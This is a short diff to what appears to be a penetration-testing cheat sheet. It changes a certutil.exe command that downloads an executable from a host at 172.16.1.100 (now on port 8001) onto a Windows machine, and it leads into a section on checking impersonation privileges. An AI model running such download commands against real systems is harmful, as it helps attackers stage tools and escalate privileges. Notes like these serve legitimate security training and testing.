@@ -2,7 +2,7 @@
 
 wget for Windows:
 ```
-certutil.exe -urlcache -f http://172.16.1.100/FILE.exe OUTFILE.exe
+certutil.exe -urlcache -f http://172.16.1.100:8001/FILE.exe OUTFILE.exe
 ```
 
 check for impersonate privs and other privs:
